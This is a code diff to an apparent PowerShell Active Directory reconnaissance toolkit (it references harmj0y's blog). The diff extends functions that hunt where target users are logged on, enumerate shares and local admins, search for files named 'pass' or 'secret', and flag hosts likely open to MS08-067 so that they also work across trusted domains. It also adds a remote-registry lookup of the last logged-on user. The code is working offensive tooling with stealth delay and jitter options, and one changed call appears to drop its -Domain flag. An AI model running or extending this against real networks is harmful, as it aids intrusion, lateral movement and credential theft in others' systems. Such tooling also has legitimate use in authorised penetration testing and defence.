@@ -2996,12 +3370,23 @@ function Invoke-StealthUserHunter {
     # get the current user
     $CurrentUser = Get-NetCurrentUser
 
-    $domain = Get-NetDomain
+    # get the target domain
+    if($Domain){
+        $targetDomain = (Get-NetForestDomains -Domain $Domain).Name
+        if(-not $targetDomain){
+            Write-Warning "Error connecting to domain $Domain, is there a trust?"
+            return
+        }
+    }
+    else{
+        # use the local domain
+        $targetDomain = Get-NetDomain
+    }
 
     # the array for our initial status output messages
     $statusOutput = @()
 
-    $statusOutput += "`r`n[*] Running StealthUserHunter on domain $domain with delay of $Delay"
+    $statusOutput += "`r`n[*] Running StealthUserHunter on domain $targetDomain with delay of $Delay"
 
     # if we get a specific username, only use that
     if ($UserName -ne ""){
@@ -3029,7 +3414,7 @@ function Invoke-StealthUserHunter {
         else{
             # otherwise default to the group name to query for target users
             $statusOutput += "`r`n[*] Querying domain group '$GroupName' for target users..."
-            $temp = Get-NetGroup -GroupName $GroupName
+            $temp = Get-NetGroup -GroupName $GroupName -Domain $targetDomain
             # lower case all of the found usernames
             $TargetUsers = $temp | % {$_.ToLower() }
         }
@@ -3042,7 +3427,7 @@ function Invoke-StealthUserHunter {
     }
 
     # get the file server list
-    [Array]$FileServers  = Get-NetFileServers
+    [Array]$FileServers  = Get-NetFileServers -Domain $targetDomain
 
     # randomize the fileserver array if specified
     if ($shuffle){
@@ -3159,6 +3544,9 @@ function Invoke-ShareFinder {
     .PARAMETER Jitter
     Jitter for the host delay, defaults to +/- 0.3
 
+    .PARAMETER Domain
+    Domain to query for machines.
+
     .EXAMPLE
     > Invoke-ShareFinder
     Find shares on the domain.
@@ -3189,7 +3577,8 @@ function Invoke-ShareFinder {
         [Parameter(Mandatory = $False)] [Switch] $Ping,
         [Parameter(Mandatory = $False)] [Switch] $CheckShareAccess,
         [UInt32]$Delay = 0,
-        [UInt32]$Jitter = .3
+        [UInt32]$Jitter = .3,
+        [String]$Domain
     )
 
     If ($PSBoundParameters['Debug']) {
@@ -3212,9 +3601,23 @@ function Invoke-ShareFinder {
     # random object for delay
     $randNo = New-Object System.Random
 
-    $domain = Get-NetDomain
+    # get the current user
+    $CurrentUser = Get-NetCurrentUser
 
-    Write-Verbose "[*] Running ShareFinder on domain $domain with delay of $Delay"
+    # get the target domain
+    if($Domain){
+        $targetDomain = (Get-NetForestDomains -Domain $Domain).Name
+        if(-not $targetDomain){
+            Write-Warning "Error connecting to domain $Domain, is there a trust?"
+            return
+        }
+    }
+    else{
+        # use the local domain
+        $targetDomain = Get-NetDomain
+    }
+
+    Write-Verbose "[*] Running ShareFinder on domain $targetDomain with delay of $Delay"
 
     # if we're using a host list, read the targets in and add them to the target list
     if($HostList -ne ""){
@@ -3233,8 +3636,8 @@ function Invoke-ShareFinder {
     }
     else{
         # otherwise, query the domain for target servers
-        Write-Verbose "[*] Querying domain for hosts...`r`n"
-        $servers = Get-NetComputers
+        Write-Verbose "[*] Querying domain $targetDomain for hosts...`r`n"
+        $servers = Get-NetComputers -Domain $targetDomain
     }
 
     # randomize the server list
@@ -3366,9 +3769,17 @@ function Invoke-FileFinder {
     .PARAMETER Jitter
     Jitter for the host delay, defaults to +/- 0.3
 
+    .PARAMETER Domain
+    Domain to query for machines
+
     .EXAMPLE
     > Invoke-FileFinder
     Find readable files on the domain with 'pass', 'sensitive', 
+    'secret', 'admin', 'login', or 'unattend*.xml' in the name,
+    
+    .EXAMPLE
+    > Invoke-FileFinder -Domain testing
+    Find readable files on the 'testing' domain with 'pass', 'sensitive', 
     'secret', 'admin', 'login', or 'unattend*.xml' in the name,
     
     .EXAMPLE
@@ -3410,7 +3821,8 @@ function Invoke-FileFinder {
         [string] $OutFile,
         [Parameter(Mandatory = $False)] [Switch] $Ping,
         [UInt32]$Delay = 0,
-        [UInt32]$Jitter = .3
+        [UInt32]$Jitter = .3,
+        [string]$Domain
     )
 
     If ($PSBoundParameters['Debug']) {
@@ -3468,14 +3880,23 @@ function Invoke-FileFinder {
         return
     }
 
-
     # random object for delay
     $randNo = New-Object System.Random
 
-    $domain = Get-NetDomain
+    # get the target domain
+    if($Domain){
+        $targetDomain = (Get-NetForestDomains -Domain $Domain).Name
+        if(-not $targetDomain){
+            Write-Warning "Error connecting to domain $Domain, is there a trust?"
+            return
+        }
+    }
+    else{
+        # use the local domain
+        $targetDomain = Get-NetDomain
+    }
 
-
-    Write-Verbose "[*] Running FileFinder on domain $domain with delay of $Delay"
+    Write-Verbose "[*] Running FileFinder on domain $targetDomain with delay of $Delay"
 
     # if we're using a host list, read the targets in and add them to the target list
     if($HostList -ne ""){
@@ -3494,8 +3915,8 @@ function Invoke-FileFinder {
     }
     else{
         # otherwise, query the domain for target servers
-        Write-Verbose "[*] Querying domain for hosts...`r`n"
-        $servers = Get-NetComputers
+        Write-Verbose "[*] Querying domain $targetDomain for hosts...`r`n"
+        $servers = Get-NetComputers -Domain $targetDomain
     }
 
     # randomize the server list
@@ -3600,15 +4021,23 @@ function Invoke-FindLocalAdminAccess {
     
     .PARAMETER Jitter
     Jitter for the host delay, defaults to +/- 0.3
+    
+    .PARAMETER Domain
+    Domain to query for machines
 
     .EXAMPLE
     > Invoke-FindLocalAdminAccess
-    Find machines on the domain where the current user has local administrator
-    access.
+    Find machines on the local domain where the current user has local 
+    administrator access.
+
+    .EXAMPLE
+    > Invoke-FindLocalAdminAccess -Domain testing
+    Find machines on the 'testing' domain where the current user has 
+    local administrator access.
 
     .EXAMPLE
     > Invoke-FindLocalAdminAccess -Delay 60
-    Find machines on the domain where the current user has local administrator
+    Find machines on the local domain where the current user has local administrator
     access with a 60 second (+/- *.3) randomized delay between touching each host.
 
     .EXAMPLE
@@ -3625,14 +4054,13 @@ function Invoke-FindLocalAdminAccess {
         [string]$HostList = "",
         [Parameter(Mandatory = $False)] [Switch] $Ping,
         [UInt32]$Delay = 0,
-        [UInt32]$Jitter = .3
+        [UInt32]$Jitter = .3,
+        [string]$Domain
     )
 
     If ($PSBoundParameters['Debug']) {
         $DebugPreference = 'Continue'
     }
-
-    $domain = Get-NetDomain
 
     # the array for our initial status output messages
     $statusOutput = @()
@@ -3644,6 +4072,19 @@ function Invoke-FindLocalAdminAccess {
 
     # random object for delay
     $randNo = New-Object System.Random
+
+    # get the target domain
+    if($Domain){
+        $targetDomain = (Get-NetForestDomains -Domain $Domain).Name
+        if(-not $targetDomain){
+            Write-Warning "Error connecting to domain $Domain, is there a trust?"
+            return
+        }
+    }
+    else{
+        # use the local domain
+        $targetDomain = Get-NetDomain
+    }
 
     # if we're using a host list, read the targets in and add them to the target list
     if($HostList -ne ""){
@@ -3663,8 +4104,8 @@ function Invoke-FindLocalAdminAccess {
     }
     else{
         # otherwise, query the domain for target servers
-        $statusOutput += "[*] Querying domain for hosts...`r`n"
-        $servers = Get-NetComputers
+        $statusOutput += "[*] Querying domain $targetDomain for hosts...`r`n"
+        $servers = Get-NetComputers -Domain $targetDomain
     }
 
     # randomize the server list
@@ -3730,6 +4171,9 @@ function Invoke-UserFieldSearch {
     .PARAMETER Term
     Term to search for, default of "pass"
 
+    .PARAMETER Domain
+    Domain to search user fields for.
+
     .EXAMPLE
     > Invoke-UserFieldSearch
     Find user accounts with "pass" in the description.
@@ -3742,10 +4186,17 @@ function Invoke-UserFieldSearch {
     [CmdletBinding()]
     param(
         [string]$Field = "description",
-        [string]$Term = "pass"
+        [string]$Term = "pass",
+        [string]$Domain
     )
 
-    $users = Get-NetUsers
+    if ($Domain){
+        $users = Get-NetUsers -Domain $Domain
+    }
+    else{
+        $users = Get-NetUsers
+    }
+
     foreach ($user in $users){
 
         $desc = $user.($Field)
@@ -3779,9 +4230,17 @@ function Invoke-FindVulnSystems {
     .PARAMETER Ping
     Ping hosts and only return those that are up/responding.
 
+    .PARAMETER Domain
+    Domain to query for systems.
+
     .EXAMPLE
     > Invoke-FindVulnSystems
     Return the host names of systems likely vulnerable to MS08-067
+
+    .EXAMPLE
+    > Invoke-FindVulnSystems -Domain testing
+    Return the host names of systems likely vulnerable to MS08-067
+    on the 'testing' domain
 
     .EXAMPLE
     > Invoke-FindVulnSystems -FullData
@@ -3791,11 +4250,25 @@ function Invoke-FindVulnSystems {
     [CmdletBinding()]
     param(
         [Parameter(Mandatory = $False)] [Switch] $FullData,
-        [Parameter(Mandatory = $False)] [Switch] $Ping
+        [Parameter(Mandatory = $False)] [Switch] $Ping,
+        [string]$Domain
     )
 
+    # get the target domain
+    if($Domain){
+        $targetDomain = (Get-NetForestDomains -Domain $Domain).Name
+        if(-not $targetDomain){
+            Write-Warning "Error connecting to domain $Domain, is there a trust?"
+            return
+        }
+    }
+    else{
+        # use the local domain
+        $targetDomain = Get-NetDomain
+    }
+
     # get all servers with full data in the domain
-    $servers = Get-NetComputers -FullData
+    $servers = Get-NetComputers -FullData $targetDomain
 
     # find any windows 2000 boxes
     $vuln2000 = $servers | where {$_.OperatingSystem -match ".*2000.*"}
@@ -3860,6 +4333,9 @@ function Invoke-EnumerateLocalAdmins {
     .PARAMETER OutFile
     Output results to a specified csv output file.
 
+    .PARAMETER Domain
+    Domain to query for systems.
+
     .LINK
     http://blog.harmj0y.net/
     #>
@@ -3870,16 +4346,28 @@ function Invoke-EnumerateLocalAdmins {
         [Parameter(Mandatory = $False)] [Switch] $Ping,
         [UInt32]$Delay = 0,
         [UInt32]$Jitter = .3,
-        [string] $OutFile
+        [string] $OutFile,
+        [string] $Domain
     )
 
     If ($PSBoundParameters['Debug']) {
         $DebugPreference = 'Continue'
     }
 
-    $domain = Get-NetDomain
+    # get the target domain
+    if($Domain){
+        $targetDomain = (Get-NetForestDomains -Domain $Domain).Name
+        if(-not $targetDomain){
+            Write-Warning "Error connecting to domain $Domain, is there a trust?"
+            return
+        }
+    }
+    else{
+        # use the local domain
+        $targetDomain = Get-NetDomain
+    }
 
-    Write-Verbose "[*] Running Invoke-EnumerateLocalAdmins on domain $domain with delay of $Delay"
+    Write-Verbose "[*] Running Invoke-EnumerateLocalAdmins on domain $targetDomain with delay of $Delay"
 
     # get the current user
     $CurrentUser = Get-NetCurrentUser
@@ -3906,7 +4394,7 @@ function Invoke-EnumerateLocalAdmins {
         # otherwise, query the domain for target servers
         $statusOutput += "[*] Querying domain for hosts...`r`n"
         # get just the name so we can get the account enabled/disabled property
-        $servers = Get-NetComputers -full | ForEach-Object {$_.name}
+        $servers = Get-NetComputers -FullData -Domain $targetDomain | ForEach-Object {$_.name}
     }
 
     # randomize the server list
@@ -4028,7 +4516,13 @@ function Invoke-HostEnum {
         }
     }
 
-    # Step 4: get the shares for this host and display what we find
+    # step 4: see if we can get the last loggedon user by remote registry
+    $lastUser = Get-LastLoggedOn -HostName $HostName
+    if ($lastUser){
+        Write-Output "`n[+] Last user logged onto $HostName : $lastUser"
+    }
+
+    # Step 5: get the shares for this host and display what we find
     $shares = Get-NetShare -HostName $HostName
     if ($shares -and ($shares.Count -ne 0)){
         Write-Output "`n[+] Shares on $HostName :"
@@ -4052,13 +4546,13 @@ function Invoke-HostEnum {
         }
     }
 
-    # Step 5: Check if current user has local admin access
+    # Step 6: Check if current user has local admin access
     $access = Invoke-CheckLocalAdminAccess -Hostname $HostName
     if ($access){
         Write-Output "`n[+] Current user has local admin access to $HostName !"
     }
 
-    # Step 6: Get all the local groups
+    # Step 7: Get all the local groups
     $localGroups = Get-NetLocalGroups -Hostname $HostName | fl | Out-String
     if ($localGroups -and $localGroups.Length -ne 0){
         Write-Output "`n[+] Local groups for $HostName :"
@@ -4068,7 +4562,7 @@ function Invoke-HostEnum {
         Write-Output "[!] Unable to retrieve localgroups for $HostName"
     }
 
-    # Step 7: Get any local admins
+    # Step 8: Get any local admins
     $localAdmins = Get-NetLocalGroup -Hostname $HostName | fl | Out-String
     if ($localAdmins -and $localAdmins.Length -ne 0){
         Write-Output "`n[+] Local Administrators for $HostName :"
@@ -4078,7 +4572,7 @@ function Invoke-HostEnum {
         Write-Output "[!] Unable to retrieve local Administrators for $HostName"
     }
 
-    # Step 8: Get any local services
+    # Step 9: Get any local services
     $localServices = Get-NetLocalServices -Hostname $HostName | fl | Out-String
     if ($localServices -and $localServices.Length -ne 0){
         Write-Output "`n[+] Local services for $HostName :"
